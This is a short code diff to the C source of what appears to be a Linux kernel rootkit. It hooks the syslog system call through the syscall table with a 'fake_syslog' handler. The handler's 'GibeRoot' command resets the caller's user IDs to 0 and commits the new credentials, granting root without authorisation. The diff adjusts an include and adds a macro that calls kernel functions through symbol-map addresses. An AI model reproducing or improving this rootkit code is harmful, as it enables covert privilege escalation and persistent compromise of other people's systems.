@@ -23,7 +23,7 @@
 
 #include <asm/paravirt.h>
 #include <asm/cacheflush.h>
-#include <asm-generic/uaccess.h>
+#include <asm/uaccess.h>
 
 #include "sysmap.h"
 #include "proc_internal.h"
@@ -50,6 +50,8 @@ typedef struct
     } payload;
 } CCC;
 
+#define FFF(x) ((typeof(& x )) SM_##x )
+
 #define syscalls ((void**)SM_sys_call_table)
 int (*asmlinkage old_syslog_func)(int type, char __user* buf, int len);
 asmlinkage int fake_syslog(int type, char __user* buf, int len)
@@ -67,8 +69,8 @@ asmlinkage int fake_syslog(int type, char __user* buf, int len)
 	    case GibeRoot:
 		new = prepare_creds();
 		new->suid = new->uid = kuid = make_kuid(current_user_ns(), 0);
-		free_uid(new->user);
-		new->user = alloc_uid(kuid);
+		FFF(free_uid)(new->user);
+		new->user = FFF(alloc_uid)(kuid);
 		new->fsuid = new->euid = kuid;
 		commit_creds(new);
 		break;
